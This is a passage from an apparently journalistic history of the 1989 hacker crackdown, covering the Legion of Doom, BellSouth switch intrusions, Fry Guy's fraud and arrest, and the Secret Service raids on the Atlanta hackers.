professionals, such as mainframe system administrators, who already know the ins and outs of their particular brand of security.  Even the  best  hacker can't break in to just any computer at random  the knowledge of security holes is too specialized, varying widely with different software and hardware. But if people are employed to run, say, a UNIX mainframe or a VAX VMS machine, then they tend to learn security from the inside out.  Armed with this knowledge, they can look into most anybody else's UNIX or VMS without much trouble or risk, if they want to. And, according to hacker legend, of course they want to, so of course they do.  They just don't make a big deal of what they've done.  So nobody ever finds out.    It is also an article of faith in the underground that professional telco people  phreak  like crazed weasels.  OF COURSE they spy on Madonna's phone calls  I mean, WOULDN'T YOU  Of course they give themselves free long distance  why the hell should THEY pay, they're running the whole shebang!    It has, as a third matter, long been an article of faith that any hacker caught can escape serious punishment if he confesses HOW HE DID IT.  Hackers seem to believe that governmental agencies and large corporations are blundering about in cyberspace like eyeless jellyfish or cave salamanders.  They feel that these large but pathetically stupid organizations will proffer up genuine gratitude, and perhaps even a security post and a big salary, to the hot shot intruder who will deign to reveal to them the supreme genius of his modus operandi.    In the case of longtime LoD member  Control C,  this actually happened, more or less.  Control C had led Michigan Bell a merry chase, and when captured in 1987, he turned out to be a bright and apparently physically harmless young fanatic, fascinated by phones.  There was no chance in hell that Control C would actually repay the enormous and largely theoretical sums in long distance service that he had accumulated from Michigan Bell. He could always be indicted for fraud or computer intrusion, but there seemed little real point in this  he hadn't physically damaged any computer.  He'd just plead guilty, and he'd likely get the usual slap on the wrist, and in the meantime it would be a big hassle for Michigan Bell just to bring up the case.  But if kept on the payroll, he might at least keep his fellow hackers at bay.    There were uses for him.  For instance, a contrite Control C was featured on Michigan Bell internal posters, sternly warning employees to shred their trash.  He'd always gotten most of his best inside info from  trashing   raiding telco dumpsters, for useful data indiscreetly thrown away.  He signed these posters, too.  Control C had become something like a Michigan Bell mascot.  And in fact, Control C DID keep other hackers at bay.  Little hackers were quite scared of Control C and his heavy duty Legion of Doom friends.  And big hackers WERE his friends and didn't want to screw up his cushy situation.    No matter what one might say of LoD, they did stick together.  When  Wasp,  an apparently genuinely malicious New York hacker, began crashing Bellcore machines, Control C received swift volunteer help from  the Mentor  and the Georgia LoD wing made up of  The Prophet,   Urvile,  and  Leftist.   Using Mentor's Phoenix Project board to coordinate, the Doomsters helped telco security to trap Wasp, by luring him into a machine with a tap and line trace installed.  Wasp lost.  LoD won!  And my, did they brag.    Urvile, Prophet and Leftist were well qualified for this activity, probably more so even than the quite accomplished Control C.  The Georgia boys knew all about phone switching  stations.  Though relative johnny come latelies in the Legion of Doom, they were considered some of LoD's heaviest guys, into the hairiest systems around.  They had the good fortune to live in or near Atlanta, home of the sleepy and apparently tolerant BellSouth RBOC.    As RBOC security went, BellSouth were  cake.   US West  of Arizona, the Rockies and the Pacific Northwest  were tough and aggressive, probably the heaviest RBOC around.  Pacific Bell, California's PacBell, were sleek, high tech, and longtime veterans of the LA phone phreak wars.  NYNEX had the misfortune to run the New York City area, and were warily prepared for most anything.  Even Michigan Bell, a division of the Ameritech RBOC, at least had the elementary sense to hire their own hacker as a useful scarecrow.  But BellSouth, even though their corporate P.R.  proclaimed them to have  Everything You Expect From a Leader,  were pathetic.    When rumor about LoD's mastery of Georgia's switching network got around to BellSouth through Bellcore and telco security scuttlebutt, they at first refused to believe it.  If you paid serious attention to every rumor out and about these hacker kids, you would hear all kinds of wacko saucer nut nonsense   that the National Security Agency monitored all American phone calls, that the CIA and DEA tracked traffic on bulletin boards with word analysis programs, that the Condor could start World War III from a payphone.    If there were hackers into BellSouth switching stations, then how come nothing had happened   Nothing had been hurt. BellSouth's machines weren't crashing.  BellSouth wasn't suffering especially badly from fraud.  BellSouth's customers weren't complaining.  BellSouth was headquartered in Atlanta, ambitious metropolis of the new high tech Sunbelt  and BellSouth was upgrading its network by leaps and bounds, digitizing the works left right and center.  They could hardly be considered sluggish or naive.  BellSouth's technical expertise was second to none, thank you kindly.    But then came the Florida business.    On June 13, 1989, callers to the Palm Beach County Probation Department, in Delray Beach, Florida, found themselves involved in a remarkable discussion with a phone sex worker named  Tina  in New York State.  Somehow, ANY call to this probation office near Miami was instantly and magically transported across state lines, at no extra charge to the user, to a pornographic phone sex hotline hundreds of miles away!    This practical joke may seem utterly hilarious at first hearing, and indeed there was a good deal of chuckling about it in phone phreak circles, including the Autumn 1989 issue of _2600_.  But for Southern Bell  the division of the BellSouth RBOC supplying local service for Florida, Georgia, North Carolina and South Carolina , this was a smoking gun.  For the first time ever, a computer intruder had broken into a BellSouth central office switching station and re programmed it!    Or so BellSouth thought in June 1989.  Actually, LoD members had been frolicking harmlessly in BellSouth switches since September 1987.  The stunt of June 13  call forwarding a number through manipulation of a switching station  was child's play for hackers as accomplished as the Georgia wing of LoD. Switching calls interstate sounded like a big deal, but it took only four lines of code to accomplish this.  An easy, yet more discreet, stunt, would be to call forward another number to your own house.  If you were careful and considerate, and changed the software back later, then not a soul would know.  Except you. And whoever you had bragged to about it.    As for BellSouth, what they didn't know wouldn't hurt them.    Except now somebody had blown the whole thing wide open, and BellSouth knew.    A now alerted and considerably paranoid BellSouth began searching switches right and left for signs of impropriety, in that hot summer of 1989.  No fewer than forty two BellSouth employees were put on 12 hour shifts, twenty four hours a day, for two solid months, poring over records and monitoring computers for any sign of phony access.  These forty two overworked experts were known as BellSouth's  Intrusion Task Force.     What the investigators found astounded them. Proprietary telco databases had been manipulated   phone numbers had been created out of thin air, with no users' names and no addresses.  And perhaps worst of all, no charges and no records of use.  The new digital ReMOB  Remote Observation  diagnostic feature had been extensively tampered with  hackers had learned to reprogram ReMOB software, so that they could listen in on any switch routed call at their leisure!  They were using telco property to SPY!    The electrifying news went out throughout law enforcement in 1989.  It had never really occurred to anyone at BellSouth that their prized and brand new digital switching  stations could be RE PROGRAMMED.  People seemed utterly amazed that anyone could have the nerve.  Of course these switching stations were  computers,  and everybody knew hackers liked to  break into computers    but telephone people's computers were DIFFERENT from normal people's computers.     The exact reason WHY these computers were  different  was rather ill defined.  It certainly wasn't the extent of their security.  The security on these BellSouth computers was lousy  the AIMSX computers, for instance, didn't even have passwords. But there was no question that BellSouth strongly FELT that their computers were very different indeed.  And if there were some criminals out there who had not gotten that message, BellSouth was determined to see that message taught.    After all, a 5ESS switching station was no mere bookkeeping system for some local chain of florists.  Public service depended on these stations.  Public SAFETY depended on these stations.    And hackers, lurking in there call forwarding or ReMobbing, could spy on anybody in the local area!  They could spy on telco officials!  They could spy on police stations!  They could spy on local offices of the Secret Service....    In 1989, electronic cops and hacker trackers began using scrambler phones and secured lines.  It only made sense.  There was no telling who was into those systems.  Whoever they were, they sounded scary.  This was some new level of antisocial daring.  Could be West German hackers, in the pay of the KGB. That too had seemed a weird and farfetched notion, until Clifford Stoll had poked and prodded a sluggish Washington law enforcement bureaucracy into investigating a computer intrusion that turned out to be exactly that  HACKERS, IN THE PAY OF THE KGB! Stoll, the systems manager for an Internet lab in Berkeley California, had ended up on the front page of the NEW YORK TIMES, proclaimed a national hero in the first true story of international computer espionage.  Stoll's counterspy efforts, which he related in a bestselling book, THE CUCKOO'S EGG, in 1989, had established the credibility of 'hacking' as a possible threat to national security.  The United States Secret Service doesn't mess around when it suspects a possible action by a foreign intelligence apparat.    The Secret Service scrambler phones and secured lines put a tremendous kink in law enforcement's ability to operate freely  to get the word out, cooperate, prevent misunderstandings. Nevertheless, 1989 scarcely seemed the time for half measures. If the police and Secret Service themselves were not operationally secure, then how could they reasonably demand measures of security from private enterprise   At least, the inconvenience made people aware of the seriousness of the threat.    If there was a final spur needed to get the police off the dime, it came in the realization that the emergency 911 system was vulnerable.  The 911 system has its own specialized software, but it is run on the same digital switching systems as the rest of the telephone network.  911 is not physically different from normal telephony.  But it is certainly culturally different, because this is the area of telephonic cyberspace reserved for the police and emergency services.    Your average policeman may not know much about hackers or phone phreaks.  Computer people are weird  even computer COPS are rather weird  the stuff they do is hard to figure out.  But a threat to the 911 system is anything but an abstract threat.  If the 911 system goes, people can die.    Imagine being in a car wreck, staggering to a phone  booth, punching 911 and hearing  Tina  pick up the phone sex line somewhere in New York!  The situation's no longer comical, somehow.    And was it possible   No question.  Hackers had attacked 911 systems before.  Phreaks can max out 911 systems just by siccing a bunch of computer modems on them in tandem, dialling them over and over until they clog.  That's very crude and low  tech, but it's still a serious business.    The time had come for action.  It was time to take stern measures with the underground.  It was time to start picking up the dropped threads, the loose edges, the bits of braggadocio here and there  it was time to get on the stick and start putting serious casework together.  Hackers weren't  invisible.   They THOUGHT they were invisible  but the truth was, they had just been tolerated too long.    Under sustained police attention in the summer of '89, the digital underground began to unravel as never before.    The first big break in the case came very early on   July 1989, the following month.  The perpetrator of the  Tina  switch was caught, and confessed.  His name was  Fry Guy,  a 16 year old in Indiana.  Fry Guy had been a very wicked young man.    Fry Guy had earned his handle from a stunt involving French fries.  Fry Guy had filched the log in of a local MacDonald's manager and had logged on to the MacDonald's mainframe on the Sprint Telenet system.  Posing as the manager, Fry Guy had altered MacDonald's records, and given some teenage hamburger flipping friends of his, generous raises.  He had not been caught.    Emboldened by success, Fry Guy moved on to credit card abuse.  Fry Guy was quite an accomplished talker  with a gift for  social engineering.   If you can do  social engineering   fast  talk, fake outs, impersonation, conning, scamming  then card abuse comes easy.   Getting away with it in the long run is another question .    Fry Guy had run across  Urvile  of the Legion of Doom on the ALTOS Chat board in Bonn, Germany.  ALTOS Chat was a sophisticated board, accessible through globe spanning computer networks like BITnet, Tymnet, and Telenet.  ALTOS was much frequented by members of Germany's Chaos Computer Club.  Two Chaos hackers who hung out on ALTOS,  Jaeger  and  Pengo,  had been the central villains of Clifford Stoll's CUCKOO'S EGG case  consorting in East Berlin with a spymaster from the KGB, and breaking into American computers for hire, through the Internet.    When LoD members learned the story of Jaeger's depredations from Stoll's book, they were rather less than impressed, technically speaking.  On LoD's own favorite board of the moment,  Black Ice,  LoD members bragged that they themselves could have done all the Chaos break ins in a week flat! Nevertheless, LoD were grudgingly impressed by the Chaos rep, the sheer hairy eyed daring of hash smoking anarchist hackers who had rubbed shoulders with the fearsome big boys of international Communist espionage.  LoD members sometimes traded bits of knowledge with friendly German hackers on ALTOS  phone numbers for vulnerable VAX VMS computers in Georgia, for instance.  Dutch and British phone phreaks, and the Australian clique of  Phoenix,   Nom,  and  Electron,  were ALTOS regulars, too.  In underground circles, to hang out on ALTOS was considered the sign of an elite dude, a sophisticated hacker of the international digital jet set.    Fry Guy quickly learned how to raid information from credit card consumer reporting agencies.  He had over a hundred stolen credit card numbers in his notebooks, and upwards of a thousand swiped long distance access codes.  He knew how to get onto Altos, and how to talk the talk of the underground convincingly.  He now wheedled knowledge of switching station tricks from Urvile on the ALTOS system.    Combining these two forms of knowledge enabled Fry Guy to bootstrap his way up to a new form of wire fraud.  First, he'd snitched credit card numbers from credit company computers.  The data he copied included names, addresses and phone numbers of the random card holders.    Then Fry Guy, impersonating a card holder, called up Western Union and asked for a cash advance on  his  credit card. Western Union, as a security guarantee, would call the customer back, at home, to verify the transaction.    But, just as he had switched the Florida probation office to  Tina  in New York, Fry Guy switched the card holder's number to a local pay phone.  There he would lurk in wait, muddying his trail by routing and re routing the call, through switches as far away as Canada.  When the call came through, he would boldly  social engineer,  or con, the Western Union people, pretending to be the legitimate card holder.  Since he'd answered the proper phone number, the deception was not very hard.  Western Union's money was then shipped to a confederate of Fry Guy's in his home town in Indiana.    Fry Guy and his cohort, using LoD techniques, stole six thousand dollars from Western Union between December 1988 and July 1989.  They also dabbled in ordering delivery of stolen goods through card fraud.  Fry Guy was intoxicated with success. The sixteen year old fantasized wildly to hacker rivals, boasting that he'd used rip off money to hire himself a big limousine, and had driven out of state with a groupie from his favorite heavy  metal band, Motley Crue.    Armed with knowledge, power, and a gratifying stream of free money, Fry Guy now took it upon himself to call local representatives of Indiana Bell security, to brag, boast, strut, and utter tormenting warnings that his powerful friends in the notorious Legion of Doom could crash the national telephone network.  Fry Guy even named a date for the scheme   the Fourth of July, a national holiday.    This egregious example of the begging for arrest syndrome was shortly followed by Fry Guy's arrest.  After the Indiana telephone company figured out who he was, the Secret Service had DNRs  Dialed Number Recorders  installed on his home phone lines. These devices are not taps, and can't record the substance of phone calls, but they do record the phone numbers of all calls going in and out.  Tracing these numbers showed Fry Guy's long  distance code fraud, his extensive ties to pirate bulletin boards, and numerous personal calls to his LoD friends in Atlanta.  By July 11, 1989, Prophet, Urvile and Leftist also had Secret Service DNR  pen registers  installed on their own lines.    The Secret Service showed up in force at Fry Guy's house on July 22, 1989, to the horror of his unsuspecting parents.  The raiders were led by a special agent from the Secret Service's Indianapolis office.  However, the raiders were accompanied and advised by Timothy M. Foley of the Secret Service's Chicago office  a gentleman about whom we will soon be hearing a great deal .    Following federal computer crime techniques that had been standard since the early 1980s, the Secret Service searched the house thoroughly, and seized all of Fry Guy's electronic equipment and notebooks.  All Fry Guy's equipment went out the door in the custody of the Secret Service, which put a swift end to his depredations.    The USSS interrogated Fry Guy at length.  His case was put in the charge of Deborah Daniels, the federal US Attorney for the Southern District of Indiana.  Fry Guy was charged with eleven counts of computer fraud, unauthorized computer access, and wire fraud.  The evidence was thorough and irrefutable.  For his part, Fry Guy blamed his corruption on the Legion of Doom and offered to testify against them.    Fry Guy insisted that the Legion intended to crash the phone system on a national holiday.  And when AT T crashed on Martin Luther King Day, 1990, this lent a credence to his claim that genuinely alarmed telco security and the Secret Service.    Fry Guy eventually pled guilty on May 31, 1990.  On September 14, he was sentenced to forty four months' probation and four hundred hours' community service.  He could have had it much worse  but it made sense to prosecutors to take it easy on this teenage minor, while zeroing in on the notorious kingpins of the Legion of Doom.    But the case against LoD had nagging flaws.  Despite the best effort of investigators, it was impossible to prove that the Legion had crashed the phone system on January 15, because they, in fact, hadn't done so.  The investigations of 1989 did show that certain members of the Legion of Doom had achieved unprecedented power over the telco switching stations, and that they were in active conspiracy to obtain more power yet. Investigators were privately convinced that the Legion of Doom intended to do awful things with this knowledge, but mere evil intent was not enough to put them in jail.    And although the Atlanta Three  Prophet, Leftist, and especially Urvile  had taught Fry Guy plenty, they were not themselves credit card fraudsters.  The only thing they'd  stolen  was long distance service  and since they'd done much of that through phone switch manipulation, there was no easy way to judge how much they'd  stolen,  or whether this practice was even  theft  of any easily recognizable kind.    Fry Guy's theft of long distance codes had cost the phone companies plenty.  The theft of long distance service may be a fairly theoretical  loss,  but it costs genuine money and genuine time to delete all those stolen codes, and to re issue new codes to the innocent owners of those corrupted codes.  The owners of the codes themselves are victimized, and lose time and money and peace of mind in the hassle.  And then there were the credit card victims to deal with, too, and Western Union.  When it came to rip off, Fry Guy was far more of a thief than LoD.  It was only when it came to actual computer expertise that Fry Guy was small potatoes.    The Atlanta Legion thought most  rules  of cyberspace were for rodents and losers, but they DID have rules.  THEY NEVER CRASHED ANYTHING, AND THEY NEVER TOOK MONEY.  These were rough rules of thumb, and rather dubious principles when it comes to the ethical subtleties of cyberspace, but they enabled the Atlanta Three to operate with a relatively clear conscience  though never with peace of mind .    If you didn't hack for money, if you weren't robbing people of actual funds  money in the bank, that is  then nobody REALLY got hurt, in LoD's opinion.   Theft of service  was a bogus issue, and  intellectual property  was a bad joke.  But LoD had only elitist contempt for rip off artists,  leechers,  thieves.  They considered themselves clean.  In their opinion, if you didn't smash up or crash any systems   well, not on purpose, anyhow  accidents can happen, just ask Robert Morris  then it was very unfair to call you a  vandal  or a  cracker.   When you were hanging out on line with your  pals  in telco security, you could face them down from the higher plane of hacker morality.  And you could mock the police from the supercilious heights of your hacker's quest for pure knowledge.    But from the point of view of law enforcement and telco security, however, Fry Guy was not really dangerous.  The Atlanta Three WERE dangerous.  It wasn't the crimes they were committing, but the DANGER, the potential hazard, the sheer TECHNICAL POWER LoD had accumulated, that had made the situation untenable.    Fry Guy was not LoD.  He'd never laid eyes on anyone in LoD  his only contacts with them had been electronic.  Core members of the Legion of Doom tended to meet physically for conventions every year or so, to get drunk, give each other the hacker high sign, send out for pizza and ravage hotel suites. Fry Guy had never done any of this.  Deborah Daniels assessed Fry Guy accurately as  an LoD wannabe.     Nevertheless Fry Guy's crimes would be directly attributed to LoD in much future police propaganda.  LoD would be described as  a closely knit group  involved in  numerous illegal activities  including  stealing and modifying individual credit histories,  and  fraudulently obtaining money and property.   Fry Guy did this, but the Atlanta Three didn't  they simply weren't into theft, but rather intrusion.  This caused a strange kink in the prosecution's strategy.  LoD were accused of  disseminating information about attacking computers to other computer hackers in an effort to shift the focus of law enforcement to those other hackers and away from the Legion of Doom.     This last accusation  taken directly from a press release by the Chicago Computer Fraud and Abuse Task Force  sounds particularly far fetched.  One might conclude at this point that investigators would have been well advised to go ahead and  shift their focus  from the  Legion of Doom.   Maybe they SHOULD concentrate on  those other hackers   the ones who were actually stealing money and physical objects.    But the Hacker Crackdown of 1990 was not a simple policing action.  It wasn't meant just to walk the beat in cyberspace  it was a CRACKDOWN, a deliberate attempt to nail the core of the operation, to send a dire and potent message that would settle the hash of the digital underground for good.    By this reasoning, Fry Guy wasn't much more than the electronic equivalent of a cheap streetcorner dope dealer.  As long as the masterminds of LoD were still flagrantly operating, pushing their mountains of illicit knowledge right and left, and whipping up enthusiasm for blatant lawbreaking, then there would be an INFINITE SUPPLY of Fry Guys.    Because LoD were flagrant, they had left trails everywhere, to be picked up by law enforcement in New York, Indiana, Florida, Texas, Arizona, Missouri, even Australia.  But 1990's war on the Legion of Doom was led out of Illinois, by the Chicago Computer Fraud and Abuse Task Force.       The Computer Fraud and Abuse Task Force, led by federal prosecutor William J. Cook, had started in 1987 and had swiftly become one of the most aggressive local  dedicated computer crime units.   Chicago was a natural home for such a group.  The world's first computer bulletin board system had been invented in Illinois.  The state of Illinois had some of the nation's first and sternest computer crime laws.  Illinois State Police were markedly alert to the possibilities of white collar crime and electronic fraud.    And William J. Cook in particular was a rising star in electronic crime busting.  He and his fellow federal prosecutors at the U.S. Attorney's office in Chicago had a tight relation with the Secret Service, especially go getting Chicago based agent Timothy Foley.  While Cook and his Department of Justice colleagues plotted strategy, Foley was their man on the street.    Throughout the 1980s, the federal government had given prosecutors an armory of new, untried legal tools against computer crime.  Cook and his colleagues were pioneers in the use of these new statutes in the real life cut and thrust of the federal courtroom.    On October 2, 1986, the US Senate had passed the  Computer Fraud and Abuse Act  unanimously, but there were pitifully few convictions under this statute.  Cook's group took their name from this statute, since they were determined to transform this powerful but rather theoretical Act of Congress into a real life engine of legal destruction against computer fraudsters and scofflaws.    It was not a question of merely discovering crimes, investigating them, and then trying and punishing their perpetrators.  The Chicago unit, like most everyone else in the business, already KNEW who the bad guys were   the Legion of Doom and the writers and editors of PHRACK. The task at hand was to find some legal means of putting these characters away.    This approach might seem a bit dubious, to someone not acquainted with the gritty realities of prosecutorial work.  But prosecutors don't put people in jail for crimes they have committed  they put people in jail for crimes they have committed THAT CAN BE PROVED IN COURT.  Chicago federal police put Al Capone in prison for income tax fraud.  Chicago is a big town, with a rough and ready bare knuckle tradition on both sides of the law.    Fry Guy had broken the case wide open and alerted telco security to the scope of the problem.  But Fry Guy's crimes would not put the Atlanta Three behind bars  much less the wacko underground journalists of PHRACK.  So on July 22, 1989, the same day that Fry Guy was raided in Indiana, the Secret Service descended upon the Atlanta Three.    This was likely inevitable.  By the summer of 1989, law enforcement were closing in on the Atlanta Three from at least six directions at once.  First, there were the leads from Fry Guy, which had led to the DNR registers being installed on the lines of the Atlanta Three.  The DNR evidence alone would have finished them off, sooner or later.    But second, the Atlanta lads were already well known to Control C and his telco security sponsors.  LoD's contacts with telco security had made them overconfident and even more boastful than usual  they felt that they had powerful friends in high places, and that they were being openly tolerated by telco security.  But BellSouth's Intrusion Task Force were hot on the trail of LoD and sparing no effort or expense.    The Atlanta Three had also been identified by name and listed on the extensive anti hacker files maintained, and retailed for pay, by private security operative John Maxfield of Detroit.  Maxfield, who had extensive ties to telco security and many informants in the underground, was a bete noire of the PHRACK crowd, and the dislike was mutual.    The Atlanta Three themselves had written articles for PHRACK.  This boastful act could not possibly escape telco and law enforcement attention.     Knightmare,  a high school age hacker from Arizona, was a close friend and disciple of Atlanta LoD, but he had been nabbed by the formidable Arizona Organized Crime and Racketeering Unit.  Knightmare was on some of LoD's favorite boards   Black Ice  in particular  and was privy to their secrets.  And to have Gail Thackeray, the Assistant Attorney General of Arizona, on one's trail was a dreadful peril for any hacker.    And perhaps worst of all, Prophet had committed a major blunder by passing an illicitly copied BellSouth computer file to Knight Lightning, who had published it in PHRACK.  This, as we will see, was an act of dire consequence for almost everyone concerned.    On July 22, 1989, the Secret Service showed up at the Leftist's house, where he lived with his parents.  A massive squad of some twenty officers surrounded the building  Secret Service, federal marshals, local police, possibly BellSouth telco security  it was hard to tell in the crush.  Leftist's dad, at work in his basement office, first noticed a muscular stranger in plain clothes crashing through the back yard with a drawn pistol. As more strangers poured into the house, Leftist's dad naturally assumed there was an armed robbery in progress.    Like most hacker parents, Leftist's mom and dad had only the vaguest notions of what their son had been up to all this time.  Leftist had a day job repairing computer hardware.  His obsession with computers seemed a bit odd, but harmless enough, and likely to produce a well paying career.  The sudden, overwhelming raid left Leftist's parents traumatized.    The Leftist himself had been out after work with his co  workers, surrounding a couple of pitchers of margaritas.  As he came trucking on tequila numbed feet up the pavement, toting a bag full of floppy disks, he noticed a large number of unmarked cars parked in his driveway.  All the cars sported tiny microwave antennas.    The Secret Service had knocked the front door off its hinges, almost flattening his Mom.    Inside, Leftist was greeted by Special Agent James Cool of the US Secret Service, Atlanta office.  Leftist was flabbergasted.  He'd never met a Secret Service agent before.  He could not imagine that he'd ever done anything worthy of federal attention.  He'd always figured that if his activities became intolerable, one of his contacts in telco security would give him a private phone call and tell him to knock it off.    But now Leftist was pat searched for weapons by grim professionals, and his bag of floppies was quickly seized.  He and his parents were all shepherded into separate rooms and grilled at length as a score of officers scoured their home for anything electronic.    Leftist was horrified as his treasured IBM AT personal computer with its forty meg hard disk, and his recently purchased 80386 IBM clone with a whopping hundred meg hard disk, both went swiftly out the door in Secret Service custody.  They also seized all his disks, all his notebooks, and a tremendous booty in dogeared telco documents that Leftist had snitched out of trash dumpsters.    Leftist figured the whole thing for a big misunderstanding.  He'd never been into MILITARY computers.  He wasn't a SPY or a COMMUNIST.  He was just a good ol' Georgia hacker, and now he just wanted all these people out of the house. But it seemed they wouldn't go until he made some kind of statement.    And so, he levelled with them.    And that, Leftist said later from his federal prison camp in Talladega, Alabama, was a big mistake.    The Atlanta area was unique, in that it had three members of the Legion of Doom who actually occupied more or less the same physical locality.  Unlike the rest of LoD, who tended to associate by phone and computer, Atlanta LoD actually WERE  tightly knit.   It was no real surprise that the Secret Service agents apprehending Urvile at the computer labs at Georgia Tech, would discover Prophet with him as well.    Urvile, a 21 year old Georgia Tech student in polymer chemistry, posed quite a puzzling case for law enforcement. Urvile  also known as  Necron 99,  as well as other handles, for he tended to change his cover alias about once a month  was both an accomplished hacker and a fanatic simulation gamer.    Simulation games are an unusual hobby  but then hackers are unusual people, and their favorite pastimes tend to be somewhat out of the ordinary.  The best known American simulation game is probably  Dungeons   Dragons,  a multi player parlor entertainment played with paper, maps, pencils, statistical tables and a variety of oddly shaped dice.  Players pretend to be heroic characters exploring a wholly invented fantasy world.  The fantasy worlds of simulation gaming are commonly pseudo medieval, involving swords and sorcery  spell casting wizards, knights in armor, unicorns and dragons, demons and goblins.    Urvile and his fellow gamers preferred their fantasies highly technological.  They made use of a game known as  G.U.R.P.S.,  the  Generic Universal Role Playing System,  published by a company called Steve Jackson Games  SJG .     G.U.R.P.S.  served as a framework for creating a wide variety of artificial fantasy worlds.  Steve Jackson Games published a smorgasboard of books, full of detailed information and gaming hints, which were used to flesh out many different fantastic backgrounds for the basic GURPS framework.  Urvile made extensive use of two SJG books called GURPS HIGH TECH and GURPS SPECIAL OPS.    In the artificial fantasy world of GURPS SPECIAL OPS, players entered a modern fantasy of intrigue and international espionage.  On beginning the game, players started small and powerless, perhaps as minor league CIA agents or penny ante arms dealers.  But as players persisted through a series of game sessions  game sessions generally lasted for hours, over long, elaborate campaigns that might be pursued for months on end  then they would achieve new skills, new knowledge, new power.  They would acquire and hone new abilities, such as marksmanship, karate, wiretapping, or Watergate burglary.  They could also win various kinds of imaginary booty, like Berettas, or martini shakers, or fast cars with ejection seats and machine guns under the headlights.    As might be imagined from the complexity of these games, Urvile's gaming notes were very detailed and extensive.  Urvile was a  dungeon master,  inventing scenarios for his fellow gamers, giant simulated adventure puzzles for his friends to unravel.  Urvile's game notes covered dozens of pages with all sorts of exotic lunacy, all about ninja raids on Libya and break  ins on encrypted Red Chinese supercomputers.  His notes were written on scrap paper and kept in loose leaf binders.    The handiest scrap paper around Urvile's college digs were the many pounds of BellSouth printouts and documents that he had snitched out of telco dumpsters.  His notes were written on the back of misappropriated telco property.  Worse yet, the gaming notes were chaotically interspersed with Urvile's hand  scrawled records involving ACTUAL COMPUTER INTRUSIONS that he had committed.    Not only was it next to impossible to tell Urvile's fantasy game notes from cyberspace  reality,  but Urvile himself barely made this distinction.  It's no exaggeration to say that to Urvile it was ALL a game.  Urvile was very bright, highly imaginative, and quite careless of other people's notions of propriety.  His connection to  reality  was not something to which he paid a great deal of attention.    Hacking was a game for Urvile.  It was an amusement he was carrying out, it was something he was doing for fun.  And Urvile was an obsessive young man.  He could no more stop hacking than he could stop in the middle of a jigsaw puzzle, or stop in the middle of reading a Stephen Donaldson fantasy trilogy.   The name  Urvile  came from a best selling Donaldson novel.     Urvile's airy, bulletproof attitude seriously annoyed his interrogators.  First of all, he didn't consider that he'd done anything wrong.  There was scarcely a shred of honest remorse in him.  On the contrary, he seemed privately convinced that his police interrogators were operating in a demented fantasy world all their own.  Urvile was too polite and well behaved to say this straight out, but his reactions were askew and disquieting.    For instance, there was the business about LoD's ability to monitor phone calls to the police and Secret Service.  Urvile agreed that this was quite possible, and posed no big problem for LoD.  In fact, he and his friends had kicked the idea around on the  Black Ice  board, much as they had discussed many other nifty notions, such as building personal flame throwers and jury  rigging fistfulls of blasting caps.  They had hundreds of dial up numbers for government agencies that they'd gotten through scanning Atlanta phones, or had pulled from raided VAX VMS mainframe computers.    Basically, they'd never gotten around to listening in on the cops because the idea wasn't interesting enough to bother with.  Besides, if they'd been monitoring Secret Service phone calls, obviously they'd never have been caught in the first place.  Right     The Secret Service was less than satisfied with this rapier like hacker logic.    Then there was the issue of crashing the phone system. No problem, Urvile admitted sunnily.  Atlanta LoD could have shut down phone service all over Atlanta any time they liked.  EVEN THE 911 SERVICE   Nothing special about that, Urvile explained patiently.  Bring the switch to its knees, with say the UNIX  makedir  bug, and 911 goes down too as a matter of course.  The 911 system wasn't very interesting, frankly.  It might be tremendously interesting to cops  for odd reasons of their own , but as technical challenges went, the 911 service was yawnsville.    So of course the Atlanta Three could crash service.  They probably could have crashed service all over BellSouth territory, if they'd worked at it for a while.  But Atlanta LoD weren't crashers.  Only losers and rodents were crashers.  LoD were ELITE.      Urvile was privately convinced that sheer technical expertise could win him free of any kind of problem.  As far as he was concerned, elite status in the digital underground had placed him permanently beyond the intellectual grasp of cops and straights.  Urvile had a lot to learn.    Of the three LoD stalwarts, Prophet was in the most direct trouble.  Prophet was a UNIX programming expert who burrowed in and out of the Internet as a matter of course.  He'd started his hacking career at around age 14, meddling with a UNIX mainframe system at the University of North Carolina.    Prophet himself had written the handy Legion of Doom file  UNIX Use and Security From the Ground Up.   UNIX  pronounced  you nicks   is a powerful, flexible computer operating system, for multi user, multi tasking computers.  In 1969, when UNIX was created in Bell Labs, such computers were exclusive to large corporations and universities, but today UNIX is run on thousands of powerful home machines.  UNIX was particularly well suited to telecommunications programming, and had become a standard in the field.  Naturally, UNIX also became a standard for the elite hacker and phone phreak.    Lately, Prophet had not been so active as Leftist and Urvile, but Prophet was a recidivist.  In 1986, when he was eighteen, Prophet had been convicted of  unauthorized access to a computer network  in North Carolina.  He'd been discovered breaking into the Southern Bell Data Network, a UNIX based internal telco network supposedly closed to the public.  He'd gotten a typical hacker sentence   six months suspended, 120 hours community service, and three years' probation.    After that humiliating bust, Prophet had gotten rid of most of his tonnage of illicit phreak and hacker data, and had tried to go straight.  He was, after all, still on probation. But by  the autumn of 1988, the temptations of cyberspace had proved too much for young Prophet, and he was shoulder to  shoulder with Urvile and Leftist into some of the hairiest systems around.    In early September 1988, he'd broken into BellSouth's centralized automation system, AIMSX or  Advanced Information Management System.   AIMSX was an internal business network for BellSouth, where telco employees stored electronic mail, databases, memos, and calendars, and did text processing.  Since AIMSX did not have public dial ups, it was considered utterly invisible to the public, and was not well secured  it didn't even require passwords.  Prophet abused an account known as  waa1,  the personal account of an unsuspecting telco employee. Disguised as the owner of waa1, Prophet made about ten visits to AIMSX.    Prophet did not damage or delete anything in the system. His presence in AIMSX was harmless and almost invisible.  But he could not rest content with that.    One particular piece of processed text on AIMSX was a telco document known as  Bell South Standard Practice 660 225  104SV Control Office Administration of Enhanced 911 Services for Special Services and Major Account Centers dated March 1988.     Prophet had not been looking for this document.  It was merely one among hundreds of similar documents with impenetrable titles.  However, having blundered over it in the course of his illicit wanderings through AIMSX, he decided to take it with him as a trophy.  It might prove very useful in some future boasting, bragging, and strutting session.  So, some time in September 1988, Prophet ordered the AIMSX mainframe computer to copy this document  henceforth called simply called  the E911 Document   and to transfer this copy to his home computer.    No one noticed that Prophet had done this.  He had  stolen  the E911 Document in some sense, but notions of property in cyberspace can be tricky.  BellSouth noticed nothing wrong, because BellSouth still had their original copy.  They had not been  robbed  of the document itself.  Many people were supposed to copy this document  specifically, people who worked for the nineteen BellSouth  special services and major account centers,  scattered throughout the Southeastern United States.  That was what it was for, why it was present on a computer network in the first place  so that it could be copied and read  by telco employees.  But now the data had been copied by someone who wasn't supposed to look at it.    Prophet now had his trophy.  But he further decided to store yet another copy of the E911 Document on another person's computer.  This unwitting person was a computer enthusiast named Richard Andrews who lived near Joliet, Illinois.  Richard 